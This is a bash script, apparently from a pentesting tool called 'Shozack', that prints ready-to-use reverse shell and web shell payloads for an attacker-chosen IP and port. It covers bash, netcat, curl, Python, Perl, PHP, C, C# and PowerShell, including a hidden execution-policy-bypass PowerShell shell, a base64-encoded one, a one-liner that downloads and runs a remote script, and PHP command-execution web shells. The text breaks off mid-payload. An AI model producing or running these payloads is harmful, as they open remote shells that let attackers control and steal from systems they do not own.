#!/bin/bash
# this shell genreator is part of Shozack tool 
# Author : SH0z3n

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
RESET='\033[0m'

get_shell_code() {
    local shell_type=$1
    local shell_name=$2

    case "$shell_type" in
        "reverse")
            case "$shell_name" in
                "Bash -i")
                    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
                    ;;
                "Bash 196")
                    echo "0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
                    ;;
                "Bash read line")
                    echo "exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do $line 2>&5 >&5; done"
                    ;;
                "Python3 shortest")
                    echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'"
                    ;;
		        "Bash 5")
		         echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
		            ;;
		        "Bash udp")
	        	echo "bash -i >& /dev/udp/$ip/$port 0>&1"
                ;;
		        "nc mkfifo")
		    	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip $port >/tmp/f"
                ;;
                "nc -e")
                echo "nc $ip $port -e bash"
                ;;
                "nc.exe -e")
                echo "nc.exe $ip $port -e bash";;
                "BusyBox nc -e")
                echo "busybox nc $ip $port -e bash";;
                "nc -c")
                echo "nc -c bash $ip $port";;
                "ncat -e")
                echo "ncat $ip $port -e bash";;
                "ncat.exe -e")
                echo "ncat.exe $ip $port -e bash";;
                "ncat udp")
                echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u $ip $port >/tmp/f";;
                "curl")
                echo "C='curl -Ns telnet://$ip:$port'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null";;
                "rustcat")
                echo "rcat connect -s bash $ip $port";;
                "C")
                echo "#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = $port;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("$ip");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"bash", NULL};
    execvp("bash", argv);

    return 0;       
}";;
            "C Windows")
            echo "#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "$ip"; 
char port[6] = "$port";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}";;
        "C# TCP Client")
        echo "using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("$ip", $port))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "bash";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;n
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}";;
    "C# Bash -i")
    echo "using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
	public static void Main(string[] args) {
	  Process proc = new System.Diagnostics.Process();
	  proc.StartInfo.FileName = "bash";
	  proc.StartInfo.Arguments = "-c \"bash -i >& /dev/tcp/$ip/$port 0>&1\"";
	  proc.StartInfo.UseShellExecute = false;
	  proc.StartInfo.RedirectStandardOutput = true;
	  proc.Start();

	  while (!proc.StandardOutput.EndOfStream) {
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }
	}
  }
}"
;;  
  "Haskell #1")
    echo 'module Main where
import System.Process
main = callCommand "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc '$ip' '$port' >/tmp/f"'
    ;;
    "Perl")
    echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">\&S\");open(STDOUT,\">\&S\");open(STDERR,\">\&S\");exec(\"bash -i\");};'"
    ;;
    "Perl no sh")
    echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system \$_ while<>;'"
    ;;
    "PHP Ivan Sincek")
    cat <<EOF   
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'bash';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('$ip', port);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
    
EOF
            ;;
    "PHP cmd")
    echo '<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>'
    ;;
    "PHP cmd2")
    echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'
    ;;
    "PHP cmd small")
    echo '<?=`$_GET[0]`?>'
    ;;
    "PHP exec")
    echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"bash <&3 >&3 2>&3\");'"
    ;;
    "PHP shell_exec")
    echo "php -r '\$sock=fsockopen(\"$ip\",$port);shell_exec(\"bash <&3 >&3 2>&3\");'"
    ;;
    "PHP system")
    echo "php -r '\$sock=fsockopen(\"$ip\",$port);system(\"bash <&3 >&3 2>&3\");'"
    ;;
    "PHP passthru")
    echo "php -r '\$sock=fsockopen(\"$ip\",$port);passthru(\"bash <&3 >&3 2>&3\");'"
    ;;
    "PHP popen")
    echo "php -r '\$sock=fsockopen(\"$ip\",$port);popen(\"bash <&3 >&3 2>&3\");'"
    ;;
        "PHP" | "PHP PentestMonkey")
            cat <<EOF
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private \$addr  = null;
    private \$port  = null;
    private \$os    = null;
    private \$shell = null;
    private \$descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private \$buffer  = 1024;    // read/write buffer size
    private \$clen    = 0;       // command length
    private \$error   = false;   // stream read/write error
    public function __construct(\$addr, \$port) {
        \$this->addr = \$addr;
        \$this->port = \$port;
    }
    private function detect() {
        \$detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            \$this->os    = 'LINUX';
            \$this->shell = 'bash';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            \$this->os    = 'WINDOWS';
            \$this->shell = 'cmd.exe';
        } else {
            \$detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return \$detected;
    }
    private function daemonize() {
        \$exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if ((\$pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if (\$pid > 0) {
            \$exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return \$exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump(\$data) {
        \$data = str_replace('<', '&lt;', \$data);
        \$data = str_replace('>', '&gt;', \$data);
        echo \$data;
    }
    private function read(\$stream, \$name, \$buffer) {
        if ((\$data = @fread(\$stream, \$buffer)) === false) { // suppress an error when reading from a closed blocking stream
            \$this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from \${name}, script will now exit...\n";
        }
        return \$data;
    }
    private function write(\$stream, \$name, \$data) {
        if ((\$bytes = @fwrite(\$stream, \$data)) === false) { // suppress an error when writing to a closed blocking stream
            \$this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to \${name}, script will now exit...\n";
        }
        return \$bytes;
    }
    // read/write method for non-blocking streams
    private function rw(\$input, \$output, \$iname, \$oname) {
        while ((\$data = \$this->read(\$input, \$iname, \$this->buffer)) && \$this->write(\$output, \$oname, \$data)) {
            if (\$this->os === 'WINDOWS' && \$oname === 'STDIN') { \$this->clen += strlen(\$data); } // calculate the command length
            \$this->dump(\$data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw(\$input, \$output, \$iname, \$oname) {
        \$fstat = fstat(\$input);
        \$size = \$fstat['size'];
        if (\$this->os === 'WINDOWS' && \$iname === 'STDOUT' && \$this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while (\$this->clen > 0 && (\$bytes = \$this->clen >= \$this->buffer ? \$this->buffer : \$this->clen) && \$this->read(\$input, \$iname, \$bytes)) {
                \$this->clen -= \$bytes;
                \$size -= \$bytes;
            }
        }
        while (\$size > 0 && (\$bytes = \$size >= \$this->buffer ? \$this->buffer : \$size) && (\$data = \$this->read(\$input, \$iname, \$bytes)) && \$this->write(\$output, \$oname, \$data)) {
            \$size -= \$bytes;
            \$this->dump(\$data); // script's dump
        }
    }
    public function run() {
        if (\$this->detect() && !\$this->daemonize()) {
            \$this->settings();

            // ----- SOCKET BEGIN -----
            \$socket = @fsockopen(\$this->addr, \$this->port, \$errno, \$errstr, 30);
            if (!\$socket) {
                echo "SOC_ERROR: {\$errno}: {\$errstr}\n";
            } else {
                stream_set_blocking(\$socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                \$process = @proc_open(\$this->shell, \$this->descriptorspec, \$pipes, null, null);
                if (!\$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach (\$pipes as \$pipe) {
                        stream_set_blocking(\$pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    \$status = proc_get_status(\$process);
                    @fwrite(\$socket, "SOCKET: Shell has connected! PID: " . \$status['pid'] . "\n");
                    do {
						\$status = proc_get_status(\$process);
                        if (feof(\$socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof(\$pipes[1]) || !\$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        \$streams = array(
                            'read'   => array(\$socket, \$pipes[1], \$pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        \$num_changed_streams = @stream_select(\$streams['read'], \$streams['write'], \$streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if (\$num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if (\$num_changed_streams > 0) {
                            if (\$this->os === 'LINUX') {
                                if (in_array(\$socket  , \$streams['read'])) { \$this->rw(\$socket  , \$pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array(\$pipes[2], \$streams['read'])) { \$this->rw(\$pipes[2], \$socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array(\$pipes[1], \$streams['read'])) { \$this->rw(\$pipes[1], \$socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if (\$this->os === 'WINDOWS') {
                                // order is important
                                if (in_array(\$socket, \$streams['read'])/*------*/) { \$this->rw (\$socket  , \$pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if ((\$fstat = fstat(\$pipes[2])) && \$fstat['size']) { \$this->brw(\$pipes[2], \$socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if ((\$fstat = fstat(\$pipes[1])) && \$fstat['size']) { \$this->brw(\$pipes[1], \$socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!\$this->error);
                    // ------ WORK END ------

                    foreach (\$pipes as \$pipe) {
                        fclose(\$pipe);
                    }
                    proc_close(\$process);
                }
                // ------ SHELL END ------

                fclose(\$socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
\$sh = new Shell('$ip', $port);
\$sh->run();
unset(\$sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
EOF
            ;;
     "Windows ConPty")
            echo "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ip $port"
            ;;
        "PowerShell #1")
            echo "\$LHOST = \"$ip\"; \$LPORT = $port; \$TCPClient = New-Object Net.Sockets.TCPClient(\$LHOST, \$LPORT); \$NetworkStream = \$TCPClient.GetStream(); \$StreamReader = New-Object IO.StreamReader(\$NetworkStream); \$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream); \$StreamWriter.AutoFlush = \$true; \$Buffer = New-Object System.Byte[] 1024; while (\$TCPClient.Connected) { while (\$NetworkStream.DataAvailable) { \$RawData = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length); \$Code = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$RawData -1) }; if (\$TCPClient.Connected -and \$Code.Length -gt 1) { \$Output = try { Invoke-Expression (\$Code) 2>&1 } catch { \$_ }; \$StreamWriter.Write(\"\$Outputn\"); \$Code = \$null } }; \$TCPClient.Close(); \$NetworkStream.Close(); \$StreamReader.Close(); \$StreamWriter.Close()"
            ;;
        "PowerShell #2")
            echo "powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
            ;;
        "PowerShell #3")
            echo "powershell -nop -W hidden -noni -ep bypass -c \"\$TCPClient = New-Object Net.Sockets.TCPClient('$ip', $port);\$NetworkStream = \$TCPClient.GetStream();\$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream);function WriteToStream (\$String) {[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {0};\$StreamWriter.Write(\$String + 'SHELL> ');\$StreamWriter.Flush()}WriteToStream '';while((\$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}WriteToStream (\$Output)}\$StreamWriter.Close()\""
            ;;
        "PowerShell #4 (TLS)")
            echo "\$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; \$TCPClient = New-Object Net.Sockets.TCPClient('$ip', $port);\$NetworkStream = \$TCPClient.GetStream();\$SslStream = New-Object Net.Security.SslStream(\$NetworkStream,\$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));\$SslStream.AuthenticateAsClient('cloudflare-dns.com',\$null,\$sslProtocols,\$false);if(!\$SslStream.IsEncrypted -or !\$SslStream.IsSigned) {\$SslStream.Close();exit}\$StreamWriter = New-Object IO.StreamWriter(\$SslStream);function WriteToStream (\$String) {[byte[]]\$script:Buffer = New-Object System.Byte[] 4096 ;\$StreamWriter.Write(\$String + 'SHELL> ');\$StreamWriter.Flush()};WriteToStream '';while((\$BytesRead = \$SslStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}WriteToStream (\$Output)}\$StreamWriter.Close()"
            ;;
        "PowerShell #3 (Base64)")
            echo "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAJABpAHAAIgAsACQAcABvAHIAdAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
            ;;
        "Python #1")
        echo "export RHOST="$ip";export RPORT=$port;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'";;
         "Python #2")
        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'";;
         "Python3 #1")
        echo "export RHOST="$ip";export RPORT=$port;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'";;
         "Python3 #2")
        echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'";;
         "Python3 Windows")
        echo "import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$ip",$port))

